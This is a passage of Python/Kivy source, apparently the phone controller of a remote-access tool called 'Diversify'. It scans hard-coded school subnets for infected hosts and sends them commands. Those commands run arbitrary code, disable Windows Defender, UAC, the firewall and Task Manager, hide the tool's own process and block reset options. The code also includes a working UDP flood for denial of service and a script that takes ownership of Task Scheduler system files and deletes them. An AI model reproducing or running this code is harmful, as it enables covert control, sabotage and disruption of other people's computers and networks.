        print(splitted)
        result = ""

        for i, ip in enumerate(splitted):
            if i > 1:
                result += ","
            result += ip
            
        varyobject.ids.conntext.text = result
        return
            

        
    def stopeveryrunningdos_phone(self):
        a = len(DosingThreads)
        print(DosingThreads)
        while len(DosingThreads) > 0:
            tmAAp = DosingThreads[0]
            tmAAp.kill()
            DosingThreads.remove(tmAAp)
            
        print(DosingThreads)
        Clock.schedule_once(lambda dt: vary().showpopup_message(f'Closed all threads({a})', 'Successful'))
    def close_results(self, result_layout_varyscan):
        global ClientScanNetwork, close_button, isNetworkListoopen, scanlistneworkthread, executorofscanip, snetwork_listexeaura_list, scan_network_thread, isnetworkscanrunning
        isNetworkListoopen = False
        isnetworkscanrunning = False
        
        def soitwontlagbutstilldo():
            global ClientScanNetwork, close_button, isNetworkListoopen, scanlistneworkthread, executorofscanip, snetwork_listexeaura_list, scan_network_thread, isnetworkscanrunning
    
            # Remove all widgets from the result layout
            scan_network_thread.kill()
            executorofscanip.shutdown(wait=False)
            scanlistneworkthread.kill()
            for i in snetwork_listexeaura_list:
                i.shutdown(wait=False)
            #print(i)
        try:
            threading.Thread(target=soitwontlagbutstilldo).start()
        except:
            pass
        try:
            result_layout_varyscan.remove_widget(scanning_label)
        except:
            pass
        try:
            result_layout_varyscan.remove_widget(close_button)
        except:
            pass
        try:
            for widget in ClientScanNetwork:
                result_layout_varyscan.remove_widget(widget)
        except:
            pass
        print('Removed all widgets from the result layout')

    
    # Function to unlock the Diversify Tools tab with a password
    def unlock_tools(self, instance):
        entered_password = self.password_input.text
        # print(f'Entered password: {entered_password}')
        
        if entered_password == "your_password":  # Replace "your_password" with the actual password
            self.is_tools_unlocked = True
            self.password_modal.dismiss()
        else:
            self.showpopup_message("Incorrect password!", "Error")


    
        # Function to show the password prompt modal
    def show_password_prompt(self):
        self.password_modal = ModalView(size_hint=(0.8, 0.4), background_color=(0, 0, 0, 0.5))  # Semi-transparent dark background
        content = BoxLayout(orientation='vertical', padding=dp(20), spacing=dp(10))
        content.background_color = (0.9, 0.9, 0.9, 0.8)  # Slightly opaque white background for content

        label = Label(text="Enter password to\nunlock Diversify Tools:", font_size=dp(18), color=(0.2, 0.6, 0.8, 1)) # Dark gray text
        self.password_input = TextInput(password=True, font_size=dp(18), background_color=(0.95, 0.95, 0.95, 1), foreground_color=(0.3, 0.3, 0.3, 1)) # Light gray background, darker gray text
        unlock_button = Button(text="Unlock", on_release=self.unlock_tools, font_size=dp(18), 
                             background_color=(0.1, 0.6, 0.8, 1), color=(1, 1, 1, 1)) # Blue button, white text

        content.add_widget(label)
        content.add_widget(self.password_input)
        content.add_widget(unlock_button)
         # Bind on_dismiss event
        self.password_modal.bind(on_dismiss=self.on_password_modal_dismiss)
        # self.password_modal.open()
        self.password_modal.add_widget(content)
        self.password_modal.open()

    def on_password_modal_dismiss(self, instance):
        if not self.is_tools_unlocked:
            # Handle dismissal without correct password
            print("Modal dismissed without entering password. Exiting...")
            sys.exit()  # Exit the app (or you can choose a different action)/
    

    def scan_network_and_display_results(self):
        def thisdoes(self):
            global isNetworkListoopen, close_button, result_layout_dos, scan_network_thread
            if isNetworkListoopen == True:
                print('There is a list that is already open!')
                Clock.schedule_once(lambda dt: vary().showpopup(str('There is a list that is already open!')), 0)
                return "Already open"
            isNetworkListoopen = True
            global ClientScanNetwork
            global close_button
            ClientScanNetwork = []

            result_layout_dos = self.root.ids.result_layout_dos
            global isnetworkscanrunning
            isnetworkscanrunning = True
            scan_network_thread = KThread(target=scan_network, args=(self, ))
            scan_network_thread.start()

            
            #result_layout_dos.add_widget(Label(text=f"{clients}"))

            #Clock.schedule_once(lambda dt: self.buildUIforclients(clients), 0)
                #button.pos_hint = {'center_x': 0.5, 'y': current_y}  # Set position of button using pos_hint
        global scanlistneworkthread
        scanlistneworkthread = KThread(target=thisdoes, args=(self,))
        scanlistneworkthread.start()

    def addscanninglabel(self):
        global result_layout_dos, scanning_label
        scanning_label = Label(text="Scanning the network", size_hint_y=None, height=200, color=(0.3, 0.8, 1, 1), bold=True)
        #close_button.size = 70000
        result_layout_dos.add_widget(scanning_label)
    def removescanninglabel(self):
        global result_layout_dos, scanning_label
        result_layout_dos.remove_widget(scanning_label)


    def final_button(self):
        global result_layout_dos
        lbl = Label(text='', size_hint_y=None, height=100, color=(0, 0, 0, 1))
        
        result_layout_dos.add_widget(lbl)  # Add new widget to end of list
        #current_y -= button.height  # Subtract height of button from current y


    def addclient_button(self, client):
        global result_layout_dos
        a = client.split(':')
        button = Button(text=f'{a[0]}, Port: {a[1]}', size_hint_y=None, height=200, background_color=(0.5, 0.1, 0.7, 1), color=(0.7, 0.8, 0.9, 1), bold=True)
        ClientScanNetwork.append(button)
        button.bind(on_press=lambda instance: self.traac(client))
        result_layout_dos.add_widget(button)  # Add new widget to end of list
         #   print(current_y)
            
    def addclose_button(self):
        global result_layout_dos, close_button
        close_button = Button(text="Close", size_hint_y=None, height=200, background_color=(0.7, 0.2, 0.5, 1), color=(0.8, 0.2, 0.6, 1), bold=True)
        close_button.bind(on_press=lambda instance: self.close_results(result_layout_dos))
        #close_button.size = 70000
        result_layout_dos.add_widget(close_button)
            
        

    def dosip_func(self, ip): # port isn't required
        code = f'''
import socket, threading
threads_count_to = int(12)
def tosend():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 0))
    # Send a large number of smaller packets to the target IP address
    while True:
        sock.sendto(b'A!@#' * 1024, ('{ip}', 80))
        time.sleep(0.005)
        
for i in range(threads_count_to):
    t = threading.Thread(target=tosend)
    t.start()'''
        return code

    def runpythoncode(self):
        code = self.root.ids.runpythoncode.text
        try:
            exec(code)
        except Exception as e:
            Clock.schedule_once(lambda dt: self.showpopup(e), 0)


    def traac(self, addr):
        addr = addr.split(':')
        print(f"DOS-ing {addr[0]}:{addr[1]}...")   
        ip = addr[0]
        port = int(addr[1])

        # calculate the amount of threads to create compared to the internet speed that is possible to utilize
        threads_count_to = int(18)
        def tosend():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', 0))
            # Send a large number of smaller packets to the target IP address
            while True:
                sock.sendto(b'A!@#' * 1024, (ip, port))
                time.sleep(0.005)
        for i in range(threads_count_to):
            t = threading.Thread(target=tosend)
            # DosingThreads.append(t)
            t.start()

    
    global splitertext, splitertextdiversified, q  # btw make sections, PayLoads: then write the payloads, CONTROL, write all the control related, ADVANCE, all the advance shit and etc
    splitertext = 'c9GgYdMAW7' # these need text arguments - some. 
    splitertextdiversified = 'OD2tIzZNuOHBqnu' # for diversify
    # Clock.schedule_once(lambda dt: vary().showpopup(str(vmtp)), 0)
    def showpopup(self, text, currenttimeoverwrite=False):
        print(f'There was an error: {str(text)}')
        global last_call_time
        current_time = time.time()
        
        if currenttimeoverwrite == False:
            # Check if 10 seconds have elapsed since the last call
            if current_time - last_call_time < 3:
                return
        
            last_call_time = current_time

        # create a BoxLayout for the content
        #content_layout = BoxLayout(orientation='vertical', pos_hint={'center_x': 0.5, 'center_y': 0.6})

        # create the content Label widget
        content = Label(text=text, font_size=(screen_width*0.04), markup=True, bold=True, pos_hint={'center_x': 2.3, 'center_y': 0.5})
        content.color=[1,0.3,0.5,1]
        content.bold = True
        content.text_size = (screen_width*0.4, None)
        content.size_hint_y = None
        content.halign = 'left'
        content.valign = 'middle'
        content.size = content.texture_size
        content.background_color = (0.8, 0, 0, 1)

        # add the content Label widget to the content BoxLayout
        # content_layout.add_widget(content)

        # create the Popup widget with the BoxLayout as its content
        popup = Popup(title='Error', title_color=(1, 0, 0, 0.7), content=content, background_color=(1, 0, 0, 1), title_align='center', title_size=(screen_width*0.08), separator_color=(1,0,0,1), pos_hint={'center_x':0.5,'center_y':0.6}, size_hint=(None, None), size=((screen_width*0.60, screen_height*0.35)))

        popup.open()
        return
    # Clock.schedule_once(lambda dt: vary().showpopup_message(str(vmtp)), 0)
    def showpopup_message(self, text, title_of):
        print(f'Showpopup_message, {text}, title of, {title_of}')
        text = str(text)
        title_of = str(title_of)
        content = Label(text=text, font_size=(screen_width*0.04), markup=True, bold=True, pos_hint={'center_x': 2.3, 'center_y': 0.5})
        content.color=[0.2, 0.4, 1, 1] # Blue color
        content.bold = True
        content.text_size = (screen_width*0.4, None)
        content.size_hint_y = None
        content.halign = 'left'
        content.valign = 'middle'
        content.size = content.texture_size
        content.background_color = (0.1, 0.2, 0.6, 1)

        popup = Popup(title=title_of, title_color=(0.2, 0.6, 1, 1), content=content, background_color=(0.1, 0.2, 0.6, 0.7), title_align='center', title_size=(screen_width*0.08), separator_color=(0.2,0.4,0.7,1), pos_hint={'center_x':0.5,'center_y':0.6}, size_hint=(None, None), size=((screen_width*0.60, screen_height*0.35)))

        popup.open()
        return

    def dosperspecifiedip(placeholder):
        ip = placeholder.root.ids.dosperspecifiedip.text
        placeholder.traac(ip)


    def scan_for_hosts(self):
        global host_ips_found
        host_ips_found = []
        for i in showndevicesforscandiversify:
            removeDevice(i)
        diversifyportSL = 45102 
        def anT():
            global host_ips_found
            def get_subnet(): 
                subnet = ''
                interfaces = netifaces.interfaces()
                for interface in interfaces:
                    addresses = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addresses:
                        ip_address = addresses[netifaces.AF_INET][0]['addr']
                        print(ip_address)
                        if ip_address != '127.0.0.1':
                            octets = ip_address.split('.')
                            subnet = '.'.join(octets[:3]) + '.'
                            return subnet
                return False
            
            diverisfysubnet = self.root.ids.overridensubnetdiversify.text
            subnets = []
            global subnetsSchooltouse
            if diverisfysubnet == '' and subnetsSchooltouse == False: # if subnetsSchooltouse is True then probbaly the phone subnet isn't going to be the same as the pc's and if it is then just having duplciates isn't ideal
                subnets.append(get_subnet())
            else:
                subnets = diverisfysubnet.replace(' ', '').split(',') if ',' in diverisfysubnet else [diverisfysubnet]
            print(subnets)
            if subnetsSchooltouse:
                subnets.append('10.10.144.')
                subnets.append('10.10.1.')
                subnets.append('10.10.59.')
                subnets.append('10.10.100.')
                subnets.append('10.10.245.')
                subnets.append('10.10.191.')
                subnets.append('10.10.14.')
                
            
            subnets = list(set(subnets)) # to remove duplicates
            subnets = list(filter(None, subnets))
            
            print('subnets:', subnets)
            
            if subnets[0] == False and diverisfysubnet=='':            
                Clock.schedule_once(lambda dt: self.showpopup('Please type the ipv4 subnet, I wasn\'t able to obtain it from the interface.'), 0)
                return
            for subnet in subnets:
                print(f'current working on subnet: {subnet}')

                def scan_ip(ip):
                    socket.setdefaulttimeout(0.7)
                    results = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, diversifyportSL))
                    if results == 0:
                        if ip in showndevicesforscandiversify:
                            pass
                        else:
                            host_ips_found.append(ip)
                            showndevicesforscandiversify.append(ip)
                            Clock.schedule_once(lambda dt: self.addbuttonfordiversify(ip), 0)
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip :
                    executorofscanip.map(scan_ip,[subnet + str(i) for i in range(1,255)])
                
            if len(host_ips_found) == 0:
                Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
                        
        threadofscan = KThread(target=anT)
        threadofscan.start()
    # def scan_for_hosts(self):
    #     global host_ips_found
    #     host_ips_found = []
    #     for i in showndevicesforscandiversify:
    #         removeDevice(i)
    #     diversifyportSL = 45102 
    #     def anT():
    #         global host_ips_found
    #         def get_subnet(): 
    #             subnet = ''
    #             interfaces = netifaces.interfaces()
    #             for interface in interfaces:
    #                 addresses = netifaces.ifaddresses(interface)
    #                 if netifaces.AF_INET in addresses:
    #                     ip_address = addresses[netifaces.AF_INET][0]['addr']
    #                     print(ip_address)
    #                     if ip_address != '127.0.0.1':
    #                         octets = ip_address.split('.')
    #                         subnet = '.'.join(octets[:3]) + '.'
    #                         return subnet
    #             return False

    #         diverisfysubnet = self.root.ids.overridensubnetdiversify.text

    #         if diverisfysubnet == '':
    #             subnet = get_subnet()
    #         else:
    #             subnet = diverisfysubnet
            
    #         if subnet == False:            
    #             Clock.schedule_once(lambda dt: self.showpopup('Please type the ipv4 subnet, I wasn\'t able to obtain it from the interface.'), 0)
    #             return
            
    #         print(f'subnet: {subnet}')


    #         def scan_ip(ip):
    #             socket.setdefaulttimeout(0.7)
    #             results = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, diversifyportSL))
    #             if results == 0:
    #                 if ip in showndevicesforscandiversify:
    #                     pass
    #                 else:
    #                     host_ips_found.append(ip)
    #                     showndevicesforscandiversify.append(ip)
    #                     Clock.schedule_once(lambda dt: self.addbuttonfordiversify(ip), 0)
                
    #         with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip :
    #             executorofscanip.map(scan_ip,[subnet + str(i) for i in range(1,255)])
            
    #         if len(host_ips_found) == 0:
    #             tmp = random.randint(1, 5)
    #             if tmp == 3:
    #                 Clock.schedule_once(lambda dt: self.showpopup_message("The scan for hosts was not able to identify any hosts, mayhaps you are confused with VAry?", "Scanner"), 0)
    #             else:
    #                 Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
    #     threadofscan = KThread(target=anT)
    #     threadofscan.start()


        # for ip in host_ips:
        #     host_button = Button(text=f"{ip} Click to connect (Status: Disconnected)",size_hint_y=None, height=120, background_color=(0.6, 0.2, 0.6, 1), color=(0.5, 0.2, 0.3, 1))
        #     host_button.bind(on_press=self.connect_or_disconnect)
        #     self.root.ids.devicesdiversify.add_widget(host_button)
            
    def addbuttonfordiversify(self, ip):
        host_button = Button(text=f"{ip} Click to connect (Status: Disconnected)",size_hint_y=None, height=160, background_color=(0.74, 0.2, 0.6, 1), color=(0.4, 1, 0.7, 1))
        host_button.bind(on_press=self.connect_or_disconnect)
        self.root.ids.devicesdiversify.add_widget(host_button)







    def connect_or_disconnect(self, instance):
        # Toggle the button text between "CONNECT" and "DISCONNECT"
        print(instance.text)
        if "disconnect" in instance.text:
            # is disconnected
            
            instance.text = instance.text.replace("disconnect ", "connect ").replace("Connected", "Disconnected")
            instance.background_color = (0.74, 0.2, 0.6, 1)  # Red color
            instance.color = (0.4, 1, 0.7, 1)
            ipadd = instance.text.split(' ')[0]
            print(f"Selected ip address is {ipadd}")
            diversify_devices.remove(ipadd)
            print(f'To remove {ipadd} from the list {diversify_devices}')
            # Add your disconnection logic here
            
            print('disconnect logic')
        else:
            instance.text = instance.text.replace("connect ", "disconnect ").replace("Disconnected", "Connected")
            # is connected
            
            instance.background_color = (0.2, 0.9, 0.7, 1) 
            instance.color = (1, 0.6, 0.7, 1)
            ipadd = instance.text.split(' ')[0]
            add_devices(ipadd)
            print(f"Selected ip address is {ipadd}")
            print(f'Current devices in the list are: {diversify_devices}')
            # Add your connection logic here
            print('connect logic')
            #rmStringIP(ipadd, self)
            # diverisfy functions
                
    def diversifyscanner(placeholder):
        devicesdiversify = placeholder.root.ids.devicesdiversify
        button_to_remove = devicesdiversify.ids['tmptmp']
        devicesdiversify.remove_widget(button_to_remove)

    def diversifyundefined(placeholder):
        #placeholder.root.ids.devicesdiversify.add_widget(Button(text=f'Click to add tmp to the hosts', size_hint_y=None, height=200, background_color=(0.6, 0.2, 0.6, 1), color=(0.5, 0.2, 0.3, 1)))
        # Assuming 'placeholder' is your root widget
        devicesdiversify = placeholder.root.ids.devicesdiversify
        devicesdiversify.add_widget(Button(text=f'tmp tmp',size_hint_y=None, height=120, background_color=(0.6, 0.2, 0.6, 1), color=(0.5, 0.2, 0.3, 1)))
        # Find the label with the specified text
        # for widget in devicesdiversify.children:
        #     for i in widget.children:
                # if isinstance(i, Label):
        #             print(i.text)
                    
                    
            # print(widget.children)
        # print('yes')

        #print('Added widget')
        #send(placeholder, 'undefined', mode='diversify')

    def diverisfy_subnet_ofschlang(self, instance):
        # Toggle the button text 
        # print(instance.text)
        global subnetsSchooltouse
        if "Enabled" in instance.text:
            # print('disabling the list addative')
            instance.text = instance.text.replace("Enabled", "Disabled")
            instance.background_color = (0.8, 0.2, 0.7, 1)  # Red color
            instance.color = (0.2, 0.6, 1, 1)
            # to disable the subnets list addative
            subnetsSchooltouse = False                
            
        else:
            instance.text = instance.text.replace("Disabled", "Enabled")
            instance.background_color = (0.2, 0.5, 0.8, 1) 
            instance.color = (0.9, 0.4, 0.7, 1)
            # to enable the subnets list addative
            subnetsSchooltouse = True
        # print(subnetsSchooltouse)


    def ipv4prioritize(placeholder):
        tosend = ''
        if placeholder.root.ids.ipv4prioritize.text == '': tosend = get_ip_address()
        else: tosend = placeholder.root.ids.ipv4prioritize.text
        
        send(placeholder, f'ipv4prioritize{splitertextdiversified}{tosend}', mode='diversify')
        
    def clearprioritize(placeholder):
        send(placeholder, 'clearprioritize', mode='diversify')

    def diversifyruncmd(placeholder):
        send(placeholder, f'runcmd{splitertextdiversified}{placeholder.root.ids.diversifyruncmd.text}', mode='diversify')

    def diversifyprogramvl2(placeholder):
        send(placeholder, f'programvl2{splitertextdiversified}{placeholder.root.ids.diversifyruncmd.text}', mode='diversify')

    def diversifyblackenscreen(placeholder):
        send(placeholder, f'blackenscreen{splitertextdiversified}{placeholder.root.ids.diversifyblackenscreen.text}', mode='diversify')

    def diversifytexttospeech(placeholder):
        send(placeholder, f'texttospeech{splitertextdiversified}{placeholder.root.ids.diversifytexttospeech.text}', mode='diversify')

    def diversifyspeakxlanguage(placeholder):
        send(placeholder, f'speakxlanguage{splitertextdiversified}{placeholder.root.ids.diversifytexttospeech.text}', mode='diversify')

    def diversifydisableuseraccountcontrol(placeholder):
        send(placeholder, 'disableuseraccountcontrol', mode='diversify')

    def diversifyenableuseraccountcontrol(placeholder):
        send(placeholder, 'enableuseraccountcontrol', mode='diversify')

    def diversifyswappedswaprmbandlmb(placeholder):
        send(placeholder, 'swappedswaprmbandlmb', mode='diversify')

    def diversifyunswappedswaprmbandlmb(placeholder):
        send(placeholder, 'unswappedswaprmbandlmb', mode='diversify')

    def diversifytypestringwithhumandelay(placeholder):
        send(placeholder, f'typestringwithhumandelay{splitertextdiversified}{placeholder.root.ids.diversifytypestringwithhumandelay.text}', mode='diversify')

    def diversifysendallhostsatodo(placeholder):
        send(placeholder, f'sendallhostsatodo{splitertextdiversified}{placeholder.root.ids.diversifysendallhostsatodo.text}', mode='diversify')

    def diversifyaddselftosafemode(placeholder):
        send(placeholder, 'addselftosafemode', mode='diversify')

    def diversifyprotectfileself(placeholder):
        send(placeholder, 'protectfileself', mode='diversify')

    def diversifydisablewindowsdefender(placeholder):
        send(placeholder, 'disablewindowsdefender', mode='diversify')

    def diversifyenablewindowsdefender(placeholder):
        send(placeholder, 'enablewindowsdefender', mode='diversify')

    def diversifydisableresetoptions(placeholder):
        send(placeholder, 'disableresetoptions', mode='diversify')

    def diversifyenableresetoptions(placeholder):
        send(placeholder, 'enableresetoptions', mode='diversify')

    def diversifyhandletostartsequences(placeholder):
        send(placeholder, 'handletostartsequences', mode='diversify')

    def diversifyterminateunknownprocesses(placeholder):
        send(placeholder, 'terminateunknownprocesses', mode='diversify')
        
    def diversifyrestartsystem(placeholder):
        send(placeholder, f'runcmd{splitertextdiversified}shutdown.exe /g /t 0', mode='diversify')
    def diversifygetscriptdirectory(placeholder):
        send(placeholder, 'getscriptdirectory', mode='diversify')

    def diversifygetscriptfilename(placeholder):
        send(placeholder, 'getscriptfilename', mode='diversify')

    def diversifyhideselfexecutable(placeholder):
        send(placeholder, 'hideselfexecutable', mode='diversify')

    def diversifyrestartexplorer(placeholder):
        send(placeholder, 'restartexplorer', mode='diversify')

    def diversifykillself(placeholder):
        send(placeholder, 'killself', mode='diversify')

    def diversifyresetnetwork(placeholder):
        send(placeholder, 'resetnetwork', mode='diversify')

    def diversifywindowslagclicksoundenable(placeholder):
        send(placeholder, 'diversifywindowslagclicksoundenable', mode='diversify')

    def diversifywindowslagclicksounddisable(placeholder):
        send(placeholder, 'diversifywindowslagclicksounddisable', mode='diversify')

    def diversifyprockill(placeholder):
        send(placeholder, f'prockill{splitertextdiversified}{placeholder.root.ids.diversifyprockill.text}', mode='diversify')

    def diversifysetvolume(placeholder):
        send(placeholder, f'setvolume{splitertextdiversified}{placeholder.root.ids.diversifysetvolume.text}', mode='diversify')

    # ... continue for all the other options
    def diversifyupdateselfvialink(placeholder):
        send(placeholder, f'updateselfvialink{splitertextdiversified}{placeholder.root.ids.diversifyupdateselfvialink.text}', mode='diversify')

    def diversifyrenameself(placeholder):
        send(placeholder, f'renameself{splitertextdiversified}{placeholder.root.ids.diversifyrenameself.text}', mode='diversify')

    def diversifyhideprocessvianame(placeholder):
        send(placeholder, f'hideprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifyshowprocessvianame.text}', mode='diversify')

    def diversifyshowprocessvianame(placeholder):
        send(placeholder, f'showprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifyshowprocessvianame.text}', mode='diversify')



    def diversifyfreezeallprocesses(placeholder):
        send(placeholder, 'freezeallprocesses', mode='diversify')

    def diversifyunfreezeallprocesses(placeholder):
        send(placeholder, 'unfreezeallprocesses', mode='diversify')

    def diversifyrestartself(placeholder):
        send(placeholder, 'restartself', mode='diversify')

    def diversifymovetofolder(placeholder):
        send(placeholder, f'movetofolder{splitertextdiversified}{placeholder.root.ids.diversifymovetofolder.text}', mode='diversify')

    def diversifyoffsmartassnointernet(placeholder):
        send(placeholder, 'offsmartassnointernet', mode='diversify')

    def diversifyonsmartassnointernet(placeholder):
        send(placeholder, 'onsmartassnointernet', mode='diversify')

    def diversifydosipport(placeholder):
        send(placeholder, f'dosipport{splitertextdiversified}{placeholder.root.ids.diversifydosipport.text}', mode='diversify')

    def diversifyclosedosipport(placeholder):
        send(placeholder, f'closedosipport', mode='diversify')

    def diversifydisableuwf(placeholder):
        send(placeholder, 'disableuwf', mode='diversify')

    def diversifyenableuwf(placeholder):
        send(placeholder, 'enableuwf', mode='diversify')

    def diversifyinviscurr(placeholder):
        send(placeholder, f'inviscurr{splitertextdiversified}{placeholder.root.ids.diversifyinviscurr.text}', mode='diversify')

    def diversifywebhandler(placeholder):
        send(placeholder, f'webhandler{splitertextdiversified}{placeholder.root.ids.diversifywebhandler.text}', mode='diversify')

    def diversifyplaytone(placeholder):
        send(placeholder, f'playtone{splitertextdiversified}{placeholder.root.ids.diversifyplaytonehz.text}o1wGI0ks52i40L3{placeholder.root.ids.diversifyplaytoneduration.text}', mode='diversify')

    def diversifyplayshepardtone(placeholder):
        send(placeholder, f'playshepardtone{splitertextdiversified}{placeholder.root.ids.diversifyplayshepardtonestarthz.text}thmAaBAOPlurh5w{placeholder.root.ids.diversifyplayshepardtoneendhz.text}thmAaBAOPlurh5w{placeholder.root.ids.diversifyplayshepardtoneduration.text}', mode='diversify')

    def diversifyrunpythonscript(placeholder):
        send(placeholder, f'runpythonscript{splitertextdiversified}{placeholder.root.ids.diversifyrunpythonscript.text}', mode='diversify')

    def diversifydisablefirewall(placeholder):
        send(placeholder, 'disablefirewall', mode='diversify')

    def diversifyenablefirewall(placeholder):
        send(placeholder, 'enablefirewall', mode='diversify')

    def diversifyrestarttoadvancedoptions(placeholder):
        send(placeholder, 'restarttoadvancedoptions', mode='diversify')

    def diversifydisabletaskmgr(placeholder):
        send(placeholder, 'disabletaskmgr', mode='diversify')

    def diversifyenabletaskmgr(placeholder):
        send(placeholder, 'enabletaskmgr', mode='diversify')

    def diversifyenablemouse(placeholder):
        send(placeholder, 'enablemouse', mode='diversify')

    def diversifydisablemouse(placeholder):
        send(placeholder, 'disablemouse', mode='diversify')

    def diversifyenablekeyboard(placeholder):
        send(placeholder, 'enablekeyboard', mode='diversify')

    def diversifydisablekeyboard(placeholder):
        send(placeholder, 'disablekeyboard', mode='diversify')

    def diversifypresskeys(placeholder):
        send(placeholder, f'presskeys{splitertextdiversified}{placeholder.root.ids.diversifypresskeys.text}', mode='diversify')

    def diversifywritetext(placeholder):
        send(placeholder, f'writetext{splitertextdiversified}{placeholder.root.ids.diversifywritetext.text}', mode='diversify')

    def diversifymeandtheboys(placeholder):
        send(placeholder, f'meandtheboys', mode='diversify')
    def diversifyrestarttouac(placeholder):
        send(placeholder, f'restarttouac', mode='diversify')

    def diversifyinstallchrome(placeholder):
        send(placeholder, f'installchrome', mode='diversify')

    def diversifydisableterminateunknownprocesses(placeholder):
        send(placeholder, f'disableterminateunknownprocesses', mode='diversify')
        
    def diversifyenableterminateunknownprocesses(placeholder):
        send(placeholder, f'enableterminateunknownprocesses', mode='diversify')
        
    def corrupt_taskscheduler(placeholder):
        send(placeholder, f'runpythonscript{splitertextdiversified}'+"""
programVL2('takeown /f C:\\Windows\\System32\\taskschd.dll')
programVL2('icacls "C:\\Windows\\System32\\taskschd.dll" /grant *S-1-5-32-544:F')
programVL2('taskkill /f /im taskschd.dll')
slp(0.5)
programVL2('del "C:\\Windows\\System32\\taskschd.dll"')

programVL2('takeown /f C:\\Windows\\System32\\taskschd.msc')
programVL2('icacls "C:\\Windows\\System32\\taskschd.msc" /grant *S-1-5-32-544:F')
programVL2('taskkill /f /im taskschd.msc')
slp(0.5)
programVL2('del "C:\\Windows\\System32\\taskschd.msc"')

programVL2('takeown /f C:\\Windows\\System32\\TaskSchdPS.dll')
programVL2('icacls "C:\\Windows\\System32\\TaskSchdPS.dll" /grant *S-1-5-32-544:F')
programVL2('taskkill /f /im TaskSchdPS.dll')
slp(0.5)
programVL2('del "C:\\Windows\\System32\\TaskSchdPS.dll"')
programVL2('takeown /f C:\\Windows\\System32\\schtasks.exe')
programVL2('icacls "C:\\Windows\\System32\\schtasks.exe" /grant *S-1-5-32-544:F')
programVL2('taskkill /f /im schtasks.exe')
slp(0.5)
programVL2('del "C:\\Windows\\System32\\schtasks.exe"')
    """, mode='diversify')
        
    def diversifycorrupttaskmgr(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corrupttaskmgr', mode='diversify')
    def diversifycorruptregedit(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corruptregedit', mode='diversify')
    def diversifycorruptmmc(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corruptmmc', mode='diversify')
    def diversifycorruptsfc(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corruptsfc', mode='diversify')
    def diversifycorruptsystemreset(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corruptsystemreset', mode='diversify')
    def diversifycorruptdllhost(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}corruptdllhost', mode='diversify')

    def freeze_unknown_processes(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}freeze_unknown_processes', mode='diversify')

    def bypassfirewall(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}bypassfirewall', mode='diversify')

    def sendfunc(placeholder, name): # THIUS DOES NOT WORK THE ARGS ASSIGFNED DO NOT WORK AND I HAVE NO CLUE ABOUT IF THE SINGLE WITHOUT ARGS IS WORKING
        try:
            args = (placeholder.root.ids[name]).text
        except:
            args = None
        if args == '': args = None

        if args == None:
            send(placeholder, f'runfunctionviastring{splitertextdiversified}{name}', mode='diversify')
        else:
            send(placeholder, f'runfunctionviastring{splitertextdiversified}{name}split{name}={args}', mode='diversify')

    def unblock_application_by_name(placeholder):
        send(placeholder, f'unblock_application_by_name{splitertextdiversified}{placeholder.root.ids.unblock_application_by_name.text}', mode='diversify') 

    def block_application_by_name(placeholder):
        send(placeholder, f'block_application_by_name{splitertextdiversified}{placeholder.root.ids.unblock_application_by_name.text}', mode='diversify')

    def unblock_ports_for_application(placeholder):
        send(placeholder, f'unblock_ports_for_application{splitertextdiversified}{placeholder.root.ids.unblock_ports_for_application.text}', mode='diversify')
        
    def block_ports_for_application(placeholder):
        send(placeholder, f'block_ports_for_application{splitertextdiversified}{placeholder.root.ids.unblock_ports_for_application.text}', mode='diversify')

    def reset_firewall(placeholder):
        send(placeholder, f'reset_firewall', mode='diversify')

    def diversifypayload_1(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_1', mode='diversify')
        
    def diversifypayload_2(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_2', mode='diversify')
        
    def diversifypayload_3(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_3', mode='diversify')
        
    def diversifypayload_4(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_4', mode='diversify')
        
    def diversifypayload_5(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_5', mode='diversify')
        
    def diversifypayload_6(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_6', mode='diversify')
    
    def diversifymakethescreendorotations(placeholder):
        send(placeholder, f'makethescreendorotations{splitertextdiversified}{placeholder.root.ids.diversifymakethescreendorotations.text}', mode='diversify')
    
    def diversifyscreenflipped(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}flipscreen', mode='diversify')
        
    def diversifyscreenlandscape(placeholder):
        send(placeholder, f'runfunctionviastring{splitertextdiversified}screenlandscape', mode='diversify')
        
    def diversifyscreenportraitflipped(placeholder): # right
        send(placeholder, f'runfunctionviastring{splitertextdiversified}screenportraitflipped', mode='diversify')
        
    def diversifyscreenportrait(placeholder): # left
        send(placeholder, f'runfunctionviastring{splitertextdiversified}screenportrait', mode='diversify')

    def diversifyminimizeprocessvianame(placeholder):
        send(placeholder, f'minimizeprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifychangeapperanjceprocessvianame.text}', mode='diversify')

    def diversifymaximizeprocessvianame(placeholder):
        send(placeholder, f'maximizeprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifychangeapperanjceprocessvianame.text}', mode='diversify')

